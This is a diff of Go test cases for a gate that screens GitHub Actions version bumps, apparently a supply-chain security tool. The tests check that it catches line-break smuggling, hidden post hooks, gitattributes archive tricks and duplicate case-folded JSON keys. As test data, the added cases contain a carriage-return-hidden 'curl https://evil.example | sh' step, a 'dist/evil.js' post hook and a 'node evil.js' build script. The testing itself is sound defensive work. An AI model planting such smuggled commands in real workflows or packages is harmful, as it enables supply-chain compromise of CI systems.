@@ -352,7 +352,9 @@ func TestFetchScenarios(t *testing.T) {
 			api: func(r map[string]any, old, new string) {
 				r["repos/acme/act/compare/main..."+new+"?per_page=1"] = obj{"status": "diverged"}
 			}},
-		{name: "release branch", want: model.RouteReview,
+		// Finding 9: a release branch plus a tag proves push access, not
+		// default-branch review.
+		{name: "release branch", want: model.RouteHuman, codes: []string{"actions.release-branch-only"}, notCodes: []string{"actions.not-on-default-branch"},
 			api: func(r map[string]any, old, new string) {
 				r["repos/acme/act/compare/main..."+new+"?per_page=1"] = obj{"status": "diverged"}
 				r["repos/acme/act/branches?per_page=100"] = []obj{{"name": "feature/x"}, {"name": "releases/v1"}}
@@ -408,6 +410,60 @@ func TestFetchScenarios(t *testing.T) {
 		{name: "comment-only change", want: model.RouteRefuse, codes: []string{"actions.non-uses-change"},
 			caller: func(old, new string) (map[string]string, map[string]string) {
 				return map[string]string{".github/workflows/ci.yml": wf(old, "v1")}, map[string]string{".github/workflows/ci.yml": wf(old, "v1.0.0")}
+			}},
+		// Finding 5: a lone CR (or NEL, LS, PS) is a line break to GitHub's
+		// YAML parser but not to the gate's line diff.
+		{name: "CR hides a workflow step", want: model.RouteRefuse, codes: []string{codeLineBreak},
+			caller: func(old, new string) (map[string]string, map[string]string) {
+				return map[string]string{".github/workflows/ci.yml": wf(old, "v1.0.0")},
+					map[string]string{".github/workflows/ci.yml": wf(new, "v1.0.1\r      - run: curl https://evil.example | sh")}
+			}},
+		{name: "CRLF workflow", want: model.RouteReview, notCodes: []string{codeLineBreak, "actions.non-uses-change"},
+			caller: func(old, new string) (map[string]string, map[string]string) {
+				crlf := func(s string) string { return strings.ReplaceAll(s, "\n", "\r\n") }
+				return map[string]string{".github/workflows/ci.yml": crlf(wf(old, "v1.0.0"))},
+					map[string]string{".github/workflows/ci.yml": crlf(wf(new, "v1.0.1"))}
+			}},
+		{name: "CR hides a post hook in upstream action.yml", want: model.RouteRefuse, codes: []string{codeLineBreak},
+			v2: func(f map[string]string) {
+				f["action.yml"] = strings.Replace(f["action.yml"], "main: dist/index.js\n", "main: dist/index.js # entry\r  post: dist/evil.js\n", 1)
+			}},
+		{name: "changed comment is not a version", want: model.RouteRefuse, codes: []string{"actions.version-comment-unparsed"},
+			caller: func(old, new string) (map[string]string, map[string]string) {
+				return map[string]string{".github/workflows/ci.yml": wf(old, "v1.0.0")}, map[string]string{".github/workflows/ci.yml": wf(new, "v1.0.1 extra")}
+			}},
+		{name: "unchanged comment is not a version", want: model.RouteReview, codes: []string{"actions.version-comment-unparsed"},
+			caller: func(old, new string) (map[string]string, map[string]string) {
+				return map[string]string{".github/workflows/ci.yml": wf(old, "pinned")}, map[string]string{".github/workflows/ci.yml": wf(new, "pinned")}
+			}},
+		// Finding 9: the runner runs GitHub's tarball, which applies
+		// export-subst and friends; the gate reads blobs.
+		{name: "export-subst in new commit", want: model.RouteHuman, codes: []string{"actions.archive-attributes"},
+			v2: func(f map[string]string) { f[".gitattributes"] = "dist/index.js export-subst\n" }},
+		{name: "export-ignore in nested gitattributes", want: model.RouteHuman, codes: []string{"actions.archive-attributes"},
+			v1: func(f map[string]string) { f["dist/.gitattributes"] = "[attr]hide export-ignore\nindex.js hide\n" },
+			v2: func(f map[string]string) { f["dist/.gitattributes"] = "[attr]hide export-ignore\nindex.js hide\n" }},
+		{name: "filter=lfs", want: model.RouteHuman, codes: []string{"actions.archive-attributes"},
+			v2: func(f map[string]string) { f[".gitattributes"] = "dist/*.js filter=lfs diff=lfs merge=lfs -text\n" }},
+		{name: "legacy crlf", want: model.RouteHuman, codes: []string{"actions.archive-attributes"},
+			v2: func(f map[string]string) { f[".gitattributes"] = "dist/index.js crlf=input\n" }},
+		{name: "legacy -crlf", want: model.RouteHuman, codes: []string{"actions.archive-attributes"},
+			v2: func(f map[string]string) { f[".gitattributes"] = "*.js -crlf\n" }},
+		{name: "changed file is an LFS pointer", want: model.RouteHuman, codes: []string{"actions.lfs-pointer"}, notCodes: []string{"actions.archive-attributes"},
+			v2: func(f map[string]string) {
+				f["dist/index.js"] = "version https://git-lfs.github.com/spec/v1\noid sha256:4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\nsize 12345\n"
+			}},
+		{name: "ordinary gitattributes", want: model.RouteReview, notCodes: []string{"actions.archive-attributes"},
+			v2: func(f map[string]string) {
+				f[".gitattributes"] = "* text=auto eol=lf\ndist/** -diff linguist-generated\n"
+			}},
+		{name: "case-folded scripts key", want: model.RouteRefuse, codes: []string{"actions.json-ambiguous"},
+			v2: func(f map[string]string) {
+				f["package.json"] = strings.Replace(f["package.json"], `"scripts":{"build":"ncc build src/main.ts"}`, `"scripts":{"build":"ncc build src/main.ts && node evil.js"},"Scripts":{"build":"ncc build src/main.ts"}`, 1)
+			}},
+		{name: "case-folded lockfile version", want: model.RouteRefuse, codes: []string{"actions.json-ambiguous"},
+			v2: func(f map[string]string) {
+				f["package-lock.json"] = strings.Replace(f["package-lock.json"], `"node_modules/left-pad":{"version":"1.0.1"}`, `"node_modules/left-pad":{"version":"1.0.1","Version":"1.0.0"}`, 1)
 			}},
 		{name: "action.yml in caller repo", want: model.RouteReview,
 			caller: func(old, new string) (map[string]string, map[string]string) {
